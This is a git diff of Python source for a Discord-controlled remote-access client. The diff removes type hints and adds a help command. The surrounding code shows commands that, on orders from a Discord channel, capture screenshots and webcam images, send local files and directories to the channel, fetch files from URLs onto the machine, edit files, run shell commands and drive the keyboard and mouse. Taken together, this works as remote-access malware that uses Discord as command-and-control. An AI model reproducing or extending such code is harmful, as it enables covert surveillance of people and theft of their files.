@@ -76,19 +76,19 @@ editor_filename = ""
 file_content = ""
 
 
-async def press(client: RemoteClient, message: discord.Message, args: str):
+async def press(client, message: discord.Message, args: str):
     keys = args.split(" ")
     for a in keys:
         pyautogui.press(a)
     await message.reply(f"Pressed {', '.join(keys)}")
 
 
-async def typewrite(client: RemoteClient, message: discord.Message, args: str):
+async def typewrite(client, message: discord.Message, args: str):
     pyautogui.typewrite(args)
     await message.reply(f"Typed {args}")
 
 
-async def hotkey(client: RemoteClient, message: discord.Message, args: str):
+async def hotkey(client, message: discord.Message, args: str):
     keys = args.split(" ")
     for a in keys:
         pyautogui.keyDown(a)
@@ -97,7 +97,7 @@ async def hotkey(client: RemoteClient, message: discord.Message, args: str):
     await message.reply(f"Send hotkey with commands {', '.join(keys)}")
 
 
-async def specialKeys(client: RemoteClient, message: discord.Message, args: str):
+async def specialKeys(client, message: discord.Message, args: str):
     await message.reply("\n".join(pyautogui.KEY_NAMES))
 
 async def cam(client:discord.Client, message:discord.Message, args:str):
@@ -110,7 +110,7 @@ async def cam(client:discord.Client, message:discord.Message, args:str):
         temp.close()
         os.unlink(temp.name)
 
-async def loc(client: RemoteClient, message: discord.Message, args: str):
+async def loc(client, message: discord.Message, args: str):
     if len(message.attachments) == 0:
         return await message.reply("No file specified")
     fileUrl = message.attachments[0].url
@@ -131,18 +131,18 @@ async def loc(client: RemoteClient, message: discord.Message, args: str):
     os.remove(message.attachments[0].filename)
 
 
-async def click(client: RemoteClient, message: discord.Message, args: str):
+async def click(client, message: discord.Message, args: str):
     pos = args.split(" ")
     pyautogui.click(int(pos[0]), int(pos[1]))
     await message.reply("Clicked at " + str(pos))
 
 
-async def play(client: RemoteClient, message: discord.Message, args: str):
+async def play(client, message: discord.Message, args: str):
     """
     It plays the sound file that was attached to the message
 
     :param client: The client object
-    :type client: discord.Client
+    :type client: RemoteClient
     :param message: discord.Message
     :type message: discord.Message
     :param args: str - The arguments passed to the command
@@ -185,12 +185,12 @@ def exec_command(command):
     return (exec.stdout, exec.stderr)
 
 
-async def dump(client: RemoteClient, message: discord.Message, args: str):
+async def dump(client, message: discord.Message, args: str):
     """
     It takes a file or directory, and sends it to the channel.
 
-    :param client: discord.Client
-    :type client: discord.Client
+    :param client:
+    :type client: RemoteClient
     :param message: discord.Message
     :type message: discord.Message
     :param args: str
@@ -209,14 +209,14 @@ async def dump(client: RemoteClient, message: discord.Message, args: str):
         await message.channel.send(file=discord.File(fp))
 
 
-async def screenshot(client: RemoteClient, message: discord.Message, args: str):
+async def screenshot(client, message: discord.Message, args: str):
 
     """
     It takes a screenshot of the entire screen, saves it to a file, and sends it to the channel the
     command was sent in
 
-    :param client: discord.Client - The client that the command was called from
-    :type client: discord.Client
+    :param client: - The client that the command was called from
+    :type client: RemoteClient
     :param message: discord.Message = The message object that triggered the command
     :type message: discord.Message
     :param args: str = The arguments passed to the command
@@ -229,12 +229,12 @@ async def screenshot(client: RemoteClient, message: discord.Message, args: str):
     await message.channel.send(file=discord.File(byteio, "screenshot.png"))
 
 
-async def cd(client: RemoteClient, message: discord.Message, args: str):
+async def cd(client, message: discord.Message, args: str):
     """
     It changes the directory to the one specified in the arguments.
 
     :param client: The discord client
-    :type client: discord.Client
+    :type client: RemoteClient
     :param message: The message object that triggered the command
     :type message: discord.Message
     :param args: str - The arguments passed to the command
@@ -245,12 +245,12 @@ async def cd(client: RemoteClient, message: discord.Message, args: str):
     await message.channel.send("Changed directory to " + args)
 
 
-async def upload(client: RemoteClient, message: discord.Message, args: str):
+async def upload(client, message: discord.Message, args: str):
     """
     It downloads the file from the URL, and saves it to the specified location.
 
-    :param client: discord.Client - The client that the command was called from
-    :type client: discord.Client
+    :param client: - The client that the command was called from
+    :type client: RemoteClient
     :param message: discord.Message = The message object that triggered the command
     :type message: discord.Message
     :param args: str = The arguments passed to the command
@@ -268,13 +268,13 @@ async def upload(client: RemoteClient, message: discord.Message, args: str):
         await session.close()
 
 
-async def download(client: RemoteClient, message: discord.Message, args: str):
+async def download(client, message: discord.Message, args: str):
 
     """
     It downloads a file from a URL and saves it to a file.
 
-    :param client: discord.Client - The client that the command was sent from
-    :type client: discord.Client
+    :param client: - The client that the command was sent from
+    :type client: RemoteClient
     :param message: discord.Message = The message object that triggered the command
     :type message: discord.Message
     :param args: str = The arguments passed to the command
@@ -294,13 +294,13 @@ async def download(client: RemoteClient, message: discord.Message, args: str):
         await session.close()
 
 
-async def edit(client: RemoteClient, message: discord.Message, args: str):
+async def edit(client, message: discord.Message, args: str):
     """
     It sends a message, sends a file, sends another message, waits for a message, writes the message
     content to the file, sends another message.
 
     :param client: the client object
-    :type client: discord.Client
+    :type client: RemoteClient
     :param message: The message that triggered the command
     :type message: discord.Message
     :param args: str
@@ -325,13 +325,13 @@ async def edit(client: RemoteClient, message: discord.Message, args: str):
         await message.channel.send("Too much time has passed :C")
 
 
-async def pwd(client: RemoteClient, message: discord.Message, args: str):
+async def pwd(client, message: discord.Message, args: str):
 
     """
     It sends a message to the channel the command was sent in, saying the current directory
 
     :param client: The client object
-    :type client: discord.Client
+    :type client: RemoteClient
     :param message: The message object that triggered the command
     :type message: discord.Message
     :param args: str
@@ -340,12 +340,12 @@ async def pwd(client: RemoteClient, message: discord.Message, args: str):
     await message.channel.send("Current directory is " + os.getcwd())
 
 
-async def browser(client: RemoteClient, message: discord.Message, args: str):
+async def browser(client, message: discord.Message, args: str):
     """
     It opens a web browser and goes to the URL specified in the command.
 
     :param client: The client object
-    :type client: discord.Client
+    :type client: RemoteClient
     :param message: The message object that triggered the command
     :type message: discord.Message
     :param args: str
@@ -354,6 +354,25 @@ async def browser(client: RemoteClient, message: discord.Message, args: str):
 
     webbrowser.open(args)
 
+async def help(client, message: discord.Message, args: str):
+    modules = client.modules.values()
+    print(modules)
+    docs = []
+    print(iter(modules))
+    for a in modules:
+        try:
+            docs.append(str(a.__name__ + " : "+ a.__doc__))
+        except:
+            traceback.print_exc()
+    print(docs)
+    try:
+        
+        await message.channel.send("Available commands:\n"+"\n".join(docs))
+    except:
+        help_message = "Available commands\n"+"\n".join(docs)
+        print(help_message)
+        f = BytesIO(help_message.encode())
+        await message.channel.send(file=discord.File(f, "output.txt"))
 
 # It's a discord client that connects to a specific guild and category, and has a dictionary of
 # modules that can be called.
@@ -381,6 +400,7 @@ class RemoteClient(discord.Client):
             "loc": loc,
             "click": click,
             "cam":cam,
+            "help":help,
         }
 
     async def on_ready(self):
